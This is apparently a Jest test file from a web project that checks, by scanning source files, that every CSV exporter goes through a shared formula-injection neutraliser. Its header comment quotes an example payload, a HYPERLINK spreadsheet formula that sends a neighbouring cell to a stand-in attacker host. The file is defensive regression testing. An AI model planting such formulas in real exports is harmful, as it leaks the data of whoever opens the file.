/**
 * Every CSV exporter neutralises formula triggers.
 *
 * The vulnerability this locks out is not a parsing bug — it is the opposite.
 * Eight exporters independently wrote correct RFC-4180 quote-escaping:
 *
 *     `"${(cell || '').replace(/"/g, '""')}"`
 *
 * and every one of them shipped a live formula to auditors, because Excel /
 * LibreOffice / Sheets dispatch on a cell's FIRST CHARACTER (`= + - @`, plus
 * tab and CR which can be stripped on paste) before CSV quoting means
 * anything. A control named `=HYPERLINK("http://attacker/"&A1,"click")`
 * exfiltrates the neighbouring cell under the auditor's identity.
 *
 * Because the output stays well-formed, NO parser-based test catches this and
 * no type signals it. The only durable defence is the structural one: a file
 * that builds CSV must reach the shared neutraliser.
 *
 * @see src/lib/csv/format-csv.ts
 * @see tests/unit/csv-formula-injection.test.ts — behavioural half
 */
import * as fs from 'node:fs';
import * as path from 'node:path';

const ROOT = path.resolve(__dirname, '../..');
const SRC = path.join(ROOT, 'src');

function walk(dir: string, out: string[] = []): string[] {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
        const p = path.join(dir, e.name);
        if (e.isDirectory()) {
            if (e.name === 'node_modules' || e.name === '.next') continue;
            walk(p, out);
        } else if (/\.tsx?$/.test(e.name)) {
            out.push(p);
        }
    }
    return out;
}

const stripComments = (s: string) =>
    s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

/**
 * Files that legitimately mention CSV without EMITTING it.
 *
 * Each entry needs a written reason. Reading CSV is not this guard's business
 * — `parse-csv.ts` consumes bytes we did not author, the opposite trust
 * direction from writing bytes someone else's software will execute.
 */
const NOT_EXPORTERS: Record<string, string> = {
    'src/lib/csv/parse-csv.ts': 'CSV reader, not a writer — opposite trust direction.',
    'src/lib/csv/format-csv.ts': 'The neutraliser itself.',
};

/** The signature of hand-rolled cell escaping, in every spelling found in src/. */
const HAND_ROLLED_ESCAPE = /replace\(\/"\/g,\s*['"]""['"]\)/;

/** Any reference to the shared module's exports. */
const USES_SHARED = /neutralizeCsvCell|\bcsvCell\b|\btoCsv\b/;

describe('CSV exporters neutralise formula triggers', () => {
    const files = walk(SRC);

    /**
     * The primary rule. A file that quote-escapes CSV cells by hand must also
     * reach the shared neutraliser — either directly, or through a local
     * formatter that calls it.
     *
     * Note this deliberately does NOT demand `toCsv`. Several exporters quote
     * CONDITIONALLY (bare cell when it needs no quotes), and forcing them onto
     * the always-quote helper would rewrite the byte output of files other
     * tests assert on. Sharing the security half while leaving formatting
     * alone is the point — `neutralizeCsvCell` is the piece that must never
     * diverge.
     */
    it('every file that hand-escapes CSV cells reaches the shared neutraliser', () => {
        const offenders: string[] = [];

        for (const file of files) {
            const rel = path.relative(ROOT, file);
            if (NOT_EXPORTERS[rel]) continue;

            const src = stripComments(fs.readFileSync(file, 'utf8'));
            if (!HAND_ROLLED_ESCAPE.test(src)) continue;
            if (USES_SHARED.test(src)) continue;

            offenders.push(rel);
        }

        expect({ offenders }).toEqual({ offenders: [] });
    });

    /**
     * The regression that actually happened: the vulnerable one-liner was
     * copy-pasted verbatim into five files. Name it so a sixth copy is
     * rejected on sight rather than on reasoning.
     */
    it('the copy-pasted vulnerable one-liner is gone from src/', () => {
        const ONELINER =
            /rows\.map\(\s*\(?r\)?\s*=>\s*r\.map\(\s*\(?c\)?\s*=>\s*`"\$\{\(c \|\| ''\)\.replace/;
        const offenders = files
            .filter((f) => ONELINER.test(stripComments(fs.readFileSync(f, 'utf8'))))
            .map((f) => path.relative(ROOT, f));

        expect({ offenders }).toEqual({ offenders: [] });
    });

    /**
     * Keep the trigger set honest. Dropping a character here would silently
     * re-open the hole for that prefix, and the unit tests would still pass
     * for the remaining ones — a partial fix reads exactly like a whole one.
     */
    it('the shared neutraliser still covers every trigger character', () => {
        const src = fs.readFileSync(
            path.join(SRC, 'lib/csv/format-csv.ts'),
            'utf8',
        );
        for (const trigger of ["'='", "'+'", "'-'", "'@'", "'\\t'", "'\\r'"]) {
            expect(src).toContain(trigger);
        }
    });

    /** The allowlist is a budget: shrink it, never grow it silently. */
    it('every non-exporter carve-out still exists and carries a reason', () => {
        for (const [rel, reason] of Object.entries(NOT_EXPORTERS)) {
            expect(fs.existsSync(path.join(ROOT, rel))).toBe(true);
            expect(reason.length).toBeGreaterThan(20);
        }
    });
});
